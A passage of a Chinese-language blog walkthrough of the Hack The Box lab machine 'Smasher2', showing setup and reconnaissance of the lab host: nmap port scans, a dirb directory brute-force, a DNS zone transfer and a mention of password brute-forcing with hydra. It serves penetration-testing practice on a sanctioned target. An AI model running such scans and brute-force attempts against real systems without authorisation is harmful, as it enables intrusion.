<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="介绍注意：本博客每一篇博客仅作记录供本人日后查阅。 难度：疯狂点数：50发布日期：2019年6月01日IP:10.10.10.135 user.txt和root.txt的一血分别用了07小时13分55秒，20小时29分49秒，真够疯狂的。">
<meta property="og:type" content="article">
<meta property="og:title" content="Hack-The-Box-walkthrough[Smasher2]">
<meta property="og:url" content="https://fdlucifer.github.io/2019/12/26/Smasher2/index.html">
<meta property="og:site_name" content="fdvoid0&#39;s blog">
<meta property="og:description" content="介绍注意：本博客每一篇博客仅作记录供本人日后查阅。 难度：疯狂点数：50发布日期：2019年6月01日IP:10.10.10.135 user.txt和root.txt的一血分别用了07小时13分55秒，20小时29分49秒，真够疯狂的。">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1.jpg">
<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb3.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb4.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb5.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb6.jpg">
<meta property="og:image" content="https://0xdf.gitlab.io/img/1570903084609.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb7.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb8.jpg">
<meta property="og:image" content="https://0xdf.gitlab.io/img/1570906220495.png">
<meta property="og:image" content="https://0xdf.gitlab.io/img/1570906095855.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb9.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb10.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb11.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb12.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb13.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg">
<meta property="article:published_time" content="2019-12-26T08:19:19.000Z">
<meta property="article:modified_time" content="2020-08-16T16:59:58.594Z">
<meta property="article:author" content="fdvoid0">
<meta property="article:tag" content="HackTheBox靶机练习">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1.jpg">


<link rel="canonical" href="https://fdlucifer.github.io/2019/12/26/Smasher2/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2019/12/26/Smasher2/","path":"2019/12/26/Smasher2/","title":"Hack-The-Box-walkthrough[Smasher2]"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Hack-The-Box-walkthrough[Smasher2] | fdvoid0's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="fdvoid0's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">fdvoid0's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by fdvoid0</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">43</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">42</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">206</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%80%E5%A7%8B%E4%B9%8B%E5%89%8D"><span class="nav-number">2.</span> <span class="nav-text">开始之前</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%86%E5%A4%87%E5%85%A5%E5%9D%91-Hack-The-Box"><span class="nav-number">3.</span> <span class="nav-text">准备入坑[Hack The Box]</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">4.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Shell-as-dzonerzy"><span class="nav-number">4.1.</span> <span class="nav-text">Shell as dzonerzy</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A%E5%88%A9%E7%94%A8%E5%BC%95%E7%94%A8%E8%AE%A1%E6%95%B0"><span class="nav-number">5.</span> <span class="nav-text">方法1：利用引用计数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A%E5%88%A9%E7%94%A8%E7%94%A8%E6%88%B7%E5%90%8D-x3D-x3D-%E5%AF%86%E7%A0%81"><span class="nav-number">6.</span> <span class="nav-text">方法2：利用用户名&#x3D;&#x3D;密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BE%97%E5%88%B0user-txt"><span class="nav-number">7.</span> <span class="nav-text">得到user.txt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSH%E5%AF%86%E9%92%A5%E6%8A%95%E6%AF%92"><span class="nav-number">8.</span> <span class="nav-text">SSH密钥投毒</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%EF%BC%9Adzonerzy-%E2%80%93-gt-root"><span class="nav-number">8.1.</span> <span class="nav-text">提权：dzonerzy –&gt; root</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploitation"><span class="nav-number">9.</span> <span class="nav-text">Exploitation</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="fdvoid0"
      src="/images/blackhole.png">
  <p class="site-author-name" itemprop="name">fdvoid0</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">206</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">42</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">43</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2019/12/26/Smasher2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/blackhole.png">
      <meta itemprop="name" content="fdvoid0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fdvoid0's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Hack-The-Box-walkthrough[Smasher2] | fdvoid0's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Hack-The-Box-walkthrough[Smasher2]
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2019-12-26 16:19:19" itemprop="dateCreated datePublished" datetime="2019-12-26T16:19:19+08:00">2019-12-26</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2020-08-17 00:59:58" itemprop="dateModified" datetime="2020-08-17T00:59:58+08:00">2020-08-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>9.6k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>35 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><font color="red">注意：本博客每一篇博客仅作记录供本人日后查阅。</font></p>
<p>难度：疯狂<br>点数：50<br>发布日期：2019年6月01日<br>IP:10.10.10.135</p>
<p>user.txt和root.txt的一血分别用了07小时13分55秒，20小时29分49秒，真够疯狂的。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1.jpg"></li>
<li><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></li>
</ul>
<span id="more"></span>

<h3 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h3><p>注册hack the box需要邀请码，无非就是找到注册api然后解密两次，很简单,参考网址<span class="exturl" data-url="aHR0cHM6Ly9jb2RlYnVyc3QuaW8vaGFjay10aGUtYm94LWhvdy10by1nZXQtaW52aXRlLWNvZGUtNTZlMzY5ZmM4ZGFl">Hack The Box: How to get invite code<i class="fa fa-external-link-alt"></i></span>根据教程一步一步走就能获得注册码了，英文不好的小朋友自行谷歌翻译。</p>
<h3 id="准备入坑-Hack-The-Box"><a href="#准备入坑-Hack-The-Box" class="headerlink" title="准备入坑[Hack The Box]"></a>准备入坑[Hack The Box]</h3><p>htb的每一个靶场需要vpn连接才能使用，按照下图根据说明下载.ovpn文件，然后下载openvpn连接客户端，社区免费版下载网址<span class="exturl" data-url="aHR0cHM6Ly9vcGVudnBuLm5ldC9jb21tdW5pdHktZG93bmxvYWRzLw==">Openvpn Community Downloads<i class="fa fa-external-link-alt"></i></span>,下载安装完成后导入.ovpn文件点击连接即可打开靶机的网址。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2.jpg"></p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>老规矩上nmap</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- --min-rate 10000 10.10.10.135 -v -sV (快速扫描所有开放的tcp端口)</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">53/tcp open  domain  ISC BIND 9.11.3-1ubuntu1.3 (Ubuntu Linux)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nmap -p 22,53,80 -sC -sV -A -v 10.10.10.135 (扫描端口开放的服务)</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 23:a3:55:a8:c6:cc:74:cc:4d:c7:2c:f8:<span class="built_in">fc</span>:20:4e:5a (RSA)</span><br><span class="line">|   256 16:21:ba:ce:8c:85:62:04:2e:8c:79:fa:0e:ea:9d:33 (ECDSA)</span><br><span class="line">|_  256 00:97:93:b8:59:b5:0f:79:52:e1:8a:f1:4f:ba:ac:b4 (ED25519)</span><br><span class="line">53/tcp open  domain  ISC BIND 9.11.3-1ubuntu1.3 (Ubuntu Linux)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: 9.11.3-1ubuntu1.3-Ubuntu</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nmap -sU -p- --min-rate 10000 -v 10.10.10.135 (快速扫描开放的udp端口)</span></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">53/udp open  domain</span><br></pre></td></tr></table></figure>

<p>dirb爆破一波</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://10.10.10.135/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Dec 26 20:55:10 2019</span><br><span class="line">URL_BASE: http://10.10.10.135/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://10.10.10.135/ ----</span><br><span class="line">+ http://10.10.10.135/.config (CODE:403|SIZE:294)                                                 </span><br><span class="line">+ http://10.10.10.135/_vti_bin/_vti_adm/admin.dll (CODE:403|SIZE:314)                             </span><br><span class="line">+ http://10.10.10.135/_vti_bin/_vti_aut/author.dll (CODE:403|SIZE:315)                            </span><br><span class="line">+ http://10.10.10.135/_vti_bin/shtml.dll (CODE:403|SIZE:305)                                      </span><br><span class="line">+ http://10.10.10.135/akeeba.backend.log (CODE:403|SIZE:305)                                      </span><br><span class="line">+ http://10.10.10.135/awstats.conf (CODE:403|SIZE:299)                                            </span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.135/backup/                                                        </span><br><span class="line">+ http://10.10.10.135/development.log (CODE:403|SIZE:302)                                         </span><br><span class="line">+ http://10.10.10.135/global.asa (CODE:403|SIZE:297)                                              </span><br><span class="line">+ http://10.10.10.135/global.asax (CODE:403|SIZE:298)                                                            </span><br><span class="line">+ http://10.10.10.135/index.html (CODE:200|SIZE:10918)                                                           </span><br><span class="line">+ http://10.10.10.135/main.mdb (CODE:403|SIZE:295)                                                               </span><br><span class="line">+ http://10.10.10.135/php.ini (CODE:403|SIZE:294)                                                 </span><br><span class="line">+ http://10.10.10.135/production.log (CODE:403|SIZE:301)                                          </span><br><span class="line">+ http://10.10.10.135/readfile (CODE:403|SIZE:414)                                                </span><br><span class="line">+ http://10.10.10.135/server-status (CODE:403|SIZE:300)                                           </span><br><span class="line">+ http://10.10.10.135/spamlog.log (CODE:403|SIZE:298)                                             </span><br><span class="line">+ http://10.10.10.135/thumbs.db (CODE:403|SIZE:296)                                               </span><br><span class="line">+ http://10.10.10.135/Thumbs.db (CODE:403|SIZE:296)                                               </span><br><span class="line">+ http://10.10.10.135/WS_FTP.LOG (CODE:403|SIZE:297) </span><br></pre></td></tr></table></figure>

<p>发现backup目录,这个把靶场刚发布时，&#x2F;backup受.htpassword保护，该密码作为基本身份验证的弹出窗口显示，需要用hydra爆破用户名和密码，使用kali中的rockyou.txt字典。 但是现在此内容已从box中移除，因此，如果现在访问&#x2F;backup，则会直接将您带进去。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb3.jpg"></p>
<p>下载这两个文件。</p>
<p>由于53的tcp&#x2F;udp端口都开放了，TCP上的DNS通常仅对区域传输开放。 这是要尝试的第一件事。 猜想域名是smasher.htb和smasher2.htb。 返回有趣的结果：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dig axfr @10.10.10.135 smasher2.htb</span></span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; axfr @10.10.10.135 smasher2.htb</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">smasher2.htb.           604800  IN      SOA     smasher2.htb. root.smasher2.htb. 41 604800 86400 2419200 604800</span><br><span class="line">smasher2.htb.           604800  IN      NS      smasher2.htb.</span><br><span class="line">smasher2.htb.           604800  IN      A       127.0.0.1</span><br><span class="line">smasher2.htb.           604800  IN      AAAA    ::1</span><br><span class="line">smasher2.htb.           604800  IN      PTR     wonderfulsessionmanager.smasher2.htb.</span><br><span class="line">smasher2.htb.           604800  IN      SOA     smasher2.htb. root.smasher2.htb. 41 604800 86400 2419200 604800</span><br><span class="line">;; Query time: 265 msec</span><br><span class="line">;; SERVER: 10.10.10.135<span class="comment">#53(10.10.10.135)</span></span><br><span class="line">;; WHEN: 四 12月 26 21:25:05 EST 2019</span><br><span class="line">;; XFR size: 6 records (messages 1, bytes 242)</span><br></pre></td></tr></table></figure>

<p>将下面ip地址和3个域名添加到hosts文件中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.135 wonderfulsessionmanager.smasher2.htb smasher2.htb root.smasher2.htb</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb4.jpg"></p>
<p>访问<span class="exturl" data-url="aHR0cDovL3Jvb3Quc21hc2hlcjIuaHRiL2JhY2t1cC8lRTUlOEYlOTElRTclOEUlQjAlRTglQkYlOTglRTYlOTglQUYlRTUlOEUlOUYlRTYlOUQlQTUlRTclOUElODQlRTklQTElQjUlRTklOUQlQTIlRTUlQTYlODIlRTQlQjglOEIlRTUlOUIlQkUlRTYlODklODAlRTclQTQlQkE=">http://root.smasher2.htb/backup/发现还是原来的页面如下图所示<i class="fa fa-external-link-alt"></i></span></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb5.jpg"></p>
<p>访问<span class="exturl" data-url="aHR0cDovL3dvbmRlcmZ1bHNlc3Npb25tYW5hZ2VyLnNtYXNoZXIyLmh0Yi8lRTUlQTYlODIlRTQlQjglOEI=">http://wonderfulsessionmanager.smasher2.htb/如下<i class="fa fa-external-link-alt"></i></span></p>
